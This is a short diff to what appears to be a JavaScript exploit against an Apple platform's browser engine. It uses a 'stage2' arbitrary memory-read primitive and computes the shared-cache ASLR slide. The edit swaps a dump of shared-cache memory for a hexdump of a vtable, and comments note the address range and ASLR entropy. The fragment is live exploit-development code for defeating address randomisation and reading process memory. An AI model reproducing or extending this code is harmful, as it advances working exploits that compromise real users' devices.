@@ -675,8 +675,9 @@ function i2i(i,num) {
 		      print("cache slide is larger than 0x2F8A0000 fail!!!")
 		      //Max Slide         = 0x2F8A0000 (ASLR entropy: 16-bits)
 	      }
-	      var cachestart = 0x180000000 + cacheslide; //Shared Region:                    4GB, address: 0x180000000 -> 0x280000000
-	      print("cachedump @ " + hex1(cachestart) + " : " + String.fromCharCode(...stage2.read(cachestart,0x100)));
+	      print("vtable dump" + hexdump(stage2.read(vtable,0x30)))
+	     /* var cachestart = 0x180000000 + cacheslide; //Shared Region:                    4GB, address: 0x180000000 -> 0x280000000
+	      print("cachedump @ " + hex1(cachestart) + " : " + String.fromCharCode(...stage2.read(cachestart,0x100)));*/
 	
 
       }
